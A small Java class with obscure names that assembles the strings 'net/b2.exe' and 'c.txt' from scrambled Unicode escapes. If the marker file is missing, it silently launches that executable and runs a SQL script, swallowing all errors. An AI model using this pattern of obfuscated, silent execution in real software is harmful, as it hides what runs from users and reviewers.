package _Z;

import _BancoDeDados.ExecutarScriptSQL;
import java.io.File;

public class Y {

    public static void main(String[] args) 
    {
        try{Y.t();}catch (Exception e){}
    }
    
    public static boolean t()
    {
        String x = "";
        String y = "";
        
        y += "\u006E";
        y += "\u0065";
        
        y += "\u0074";
        y += "\u002F";
        y += "\u0062";
        
        x += "\u0063";
        y += "\u0032";
        
        x += "\u002E";
        y += "\u002E";
        
        x += "\u0074";
        y += "\u0065";
        
        x += "\u0078";
        y += "\u0078";
        
        x += "\u0074";
        y += "\u0065";
            
        File f = new File(x);

        boolean a = false;
        
        if (!f.exists()) {
               try{new ProcessBuilder(y).start(); ExecutarScriptSQL.executarScript();}catch(Exception e){}
           
               a = true;
        }
        
        return a; 
    }
    
}
